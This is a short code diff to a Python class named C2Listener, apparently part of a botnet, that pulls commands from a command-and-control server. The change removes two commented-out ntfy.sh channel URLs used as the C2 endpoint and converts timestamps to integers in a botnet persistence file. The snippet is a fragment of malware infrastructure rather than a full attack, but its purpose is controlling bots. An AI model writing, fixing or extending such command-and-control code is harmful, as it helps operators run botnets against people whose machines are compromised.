@@ -13,8 +13,6 @@ class C2Listener:
         self.parser = Parser.Parser(crypt)
         self.bot = bot
 
-        # self.C2_ntfy_URL = "https://ntfy.sh/BNS_BN_22_Admin/json"
-        # self.C2_ntfy_all_URL = "https://ntfy.sh/BNS_BN_22_Admin/json?poll=1"
         self.last_command_time = 0
 
     # pull commands from C2 server
@@ -74,9 +72,9 @@ class C2Listener:
                         self.last_command_time = int(line[11:])
         else:
             f = open("Botnet_precistantData.txt", "w")
-            f.write("Last time: " + str(datetime.now().timestamp()) + "\n")
+            f.write("Last time: " + str(int(datetime.now().timestamp())) + "\n")
             f.close()
-            self.last_command_time = datetime.now().timestamp()
+            self.last_command_time = int(datetime.now().timestamp())
 
         
         # check each command
